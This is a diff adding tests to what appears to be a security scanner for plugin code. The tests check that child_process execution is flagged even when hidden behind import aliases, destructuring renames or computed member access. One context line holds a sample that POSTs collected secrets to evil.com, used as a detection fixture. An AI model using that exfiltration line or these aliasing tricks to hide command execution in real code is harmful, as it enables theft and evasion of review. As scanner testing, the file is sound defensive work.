@@ -283,6 +283,30 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
 `,
       expected: { ruleId: "env-harvesting", severity: "critical" as const },
     },
+    {
+      name: "detects child_process exec via ESM import alias (spawn as launch)",
+      source: `
+import { spawn as launch } from "node:child_process";
+launch("node", ["server.js"]);
+`,
+      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
+    },
+    {
+      name: "detects child_process exec via CJS destructure alias (exec: run)",
+      source: `
+const { exec: run } = require("child_process");
+run("node server.js");
+`,
+      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
+    },
+    {
+      name: "detects child_process exec via computed member access (cp[\"spawn\"])",
+      source: `
+import cp from "node:child_process";
+cp["spawn"]("node", ["server.js"]);
+`,
+      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
+    },
   ] as const;
 
   it("detects suspicious source patterns", () => {
@@ -311,6 +335,46 @@ const match = /^keychain:(.+)$/.exec(value);
 `;
     const findings = scanSource(source, "plugin.ts");
     expectRulePresence(findings, "dangerous-exec", false);
+  });
+
+  it("detects dangerous-exec via ESM import alias (spawn as launch)", () => {
+    const source = `import { spawn as launch } from "node:child_process";
+launch("node", ["server.js"]);`;
+    const findings = scanSource(source, "plugin.ts").filter(
+      (f) => f.ruleId === "dangerous-exec",
+    );
+    expect(findings.length).toBeGreaterThanOrEqual(1);
+    expect(findings[0]!.line).toBe(2);
+  });
+
+  it("detects dangerous-exec via CJS destructure alias (exec: run)", () => {
+    const source = `const { exec: run } = require("child_process");
+run("node server.js");`;
+    const findings = scanSource(source, "plugin.ts").filter(
+      (f) => f.ruleId === "dangerous-exec",
+    );
+    expect(findings.length).toBeGreaterThanOrEqual(1);
+    expect(findings[0]!.line).toBe(2);
+  });
+
+  it("detects dangerous-exec via computed member — double quotes", () => {
+    const source = `import cp from "node:child_process";
+cp["spawn"]("node", ["server.js"]);`;
+    const findings = scanSource(source, "plugin.ts").filter(
+      (f) => f.ruleId === "dangerous-exec",
+    );
+    expect(findings.length).toBeGreaterThanOrEqual(1);
+    expect(findings[0]!.line).toBe(2);
+  });
+
+  it("detects dangerous-exec via computed member — single quotes", () => {
+    const source = `import cp from "node:child_process";
+cp['exec']("node server.js");`;
+    const findings = scanSource(source, "plugin.ts").filter(
+      (f) => f.ruleId === "dangerous-exec",
+    );
+    expect(findings.length).toBeGreaterThanOrEqual(1);
+    expect(findings[0]!.line).toBe(2);
   });
 
   it("does not use full-line comments as source-rule context", () => {
